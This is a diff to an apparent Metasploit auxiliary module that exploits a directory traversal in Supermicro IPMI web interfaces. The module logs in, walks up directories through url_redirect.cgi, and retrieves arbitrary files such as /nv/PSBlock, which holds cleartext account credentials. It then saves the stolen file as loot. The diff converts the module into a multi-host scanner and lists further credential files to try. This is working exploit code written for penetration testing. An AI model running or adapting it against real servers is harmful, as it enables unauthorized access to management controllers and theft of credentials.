@@ -1,15 +1,17 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'uri'
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
+
 
   APP_NAME = "Supermicro web interface"
 
@@ -23,7 +25,8 @@ class Metasploit3 < Msf::Auxiliary
         a valid, but not necessarily administrator-level account, to access the contents of any file
         on the system. This includes the /nv/PSBlock file, which contains the cleartext credentials for
         all configured accounts. This module has been tested on a Supermicro Onboard IPMI (X9SCL/X9SCM)
-        with firmware version SMT_X9_214.
+        with firmware version SMT_X9_214. Other file names to try include /PSStore, /PMConfig.dat, and
+        /wsman/simple_auth.passwd
       },
       'Author'       =>
         [
@@ -33,8 +36,8 @@ class Metasploit3 < Msf::Auxiliary
       'License'     => MSF_LICENSE,
       'References'  =>
         [
-          #[ 'CVE', '' ],
-          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2013/11/06/supermicro-ipmi-firmware-vulnerabilities' ]
+          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2013/11/06/supermicro-ipmi-firmware-vulnerabilities' ],
+          [ 'URL', 'https://github.com/zenfish/ipmi/blob/master/dump_SM.py']
         ],
       'DisclosureDate' => 'Nov 06 2013'))
 
@@ -75,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
       }
     })
 
-    if res and res.code == 200 and res.body.to_s =~ /self.location="\.\.\/cgi\/url_redirect\.cgi/ and res.headers["Set-Cookie"].to_s =~ /(SID=[a-z]+)/
+    if res and res.code == 200 and res.body.to_s =~ /self.location="\.\.\/cgi\/url_redirect\.cgi/ and res.get_cookies =~ /(SID=[a-z]+)/
       return $1
     else
       return nil
@@ -87,7 +90,7 @@ class Metasploit3 < Msf::Auxiliary
     travs << "../" * datastore['DEPTH']
     travs << file
 
-    print_status("#{peer} - Retrieving file contents...")
+    print_status("Retrieving file contents...")
 
     res = send_request_cgi({
       "uri"           => "/cgi/url_redirect.cgi",
@@ -107,39 +110,39 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def run
-    print_status("#{peer} - Checking if it's a #{APP_NAME}....")
+  def run_host(ip)
+    print_status("Checking if it's a #{APP_NAME}....")
     if is_supermicro?
-      print_good("#{peer} - Check successful")
+      print_good("Check successful")
     else
-      print_error("#{peer} - #{APP_NAME} not found")
+      print_error("#{APP_NAME} not found")
       return
     end
 
-    print_status("#{peer} - Login into the #{APP_NAME}...")
+    print_status("Login into the #{APP_NAME}...")
     session = login
     if session.nil?
-      print_error("#{peer} - Failed to login, check credentials.")
+      print_error("Failed to login, check credentials.")
       return
     else
-      print_good("#{peer} - Login successful, session: #{session}")
+      print_good("Login successful, session: #{session}")
     end
 
     contents = read_file(datastore['FILEPATH'], session)
     if contents.nil?
-      print_error("#{peer} - File not downloaded")
+      print_error("File not downloaded")
       return
     end
 
     file_name = my_basename(datastore['FILEPATH'])
     path = store_loot(
-      'supermicro.ipmi.traversal',
+      'supermicro.ipmi.traversal.psblock',
       'application/octet-stream',
       rhost,
       contents,
       file_name
     )
-    print_good("#{peer} - File saved in: #{path}")
+    print_good("File saved in: #{path}")
   end
 
 end
